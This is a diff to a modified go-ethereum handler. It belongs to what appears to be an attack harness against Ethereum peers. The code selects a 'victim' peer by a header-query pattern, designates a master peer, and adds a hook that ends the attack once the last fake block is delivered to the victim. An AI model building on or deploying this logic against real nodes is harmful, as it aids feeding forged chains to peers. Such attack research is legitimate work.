@@ -19,7 +19,6 @@ package eth
 import (
 	"encoding/json"
 	"fmt"
-	"bytes"
 
 	"github.com/ethereum/go-ethereum/common"
 	"github.com/ethereum/go-ethereum/core"
@@ -68,14 +67,12 @@ func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBloc
 	first := true
 	maxNonCanonical := uint64(100)
 
-	queryForMaster := false
 	if hashMode /*&& query.Origin.Hash == bridge.Latest().Hash()*/ && query.Amount == 2 && query.Skip == 63 && query.Reverse {
 		//bridge.SetMasterPeer()
 		bridge.SetVictimIfNone(peer.Peer, peer.td)
 		if bridge.IsVictim(peer.Peer.ID().String()[:8]) {
 			bridge.SetMasterPeer()
 		}
-		queryForMaster = true
 	} else {
 		log.Info("bridge provided latest", "hash", bridge.Latest().Hash())
 	}
@@ -87,9 +84,6 @@ func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBloc
 		headers []rlp.RawValue
 		unknown bool
 		lookups int
-
-		headForMasterQuery uint64
-		pivotNumber uint64
 
 	)
 	for !unknown && len(headers) < int(query.Amount) && bytes < softResponseLimit &&
@@ -104,7 +98,6 @@ func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBloc
 				origin = chain.GetHeaderByHash(query.Origin.Hash)
 				if origin != nil {
 					query.Origin.Number = origin.Number.Uint64()
-					headForMasterQuery = query.Origin.Number
 				} else {
 					log.Info("Can't find origin")
 				}
@@ -210,6 +203,11 @@ func serviceContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBlockHe
 				headers[i], headers[j] = headers[j], headers[i]
 			}
 		}
+
+		if bridge.IsLastFakeBlock(from+count-1) && bridge.DoingDelivery() &&
+		   bridge.IsVictim(peer.Peer.ID().String()[:8]) {
+		   	bridge.EndOfAttack()
+		   }
 
 		return headers
 	}
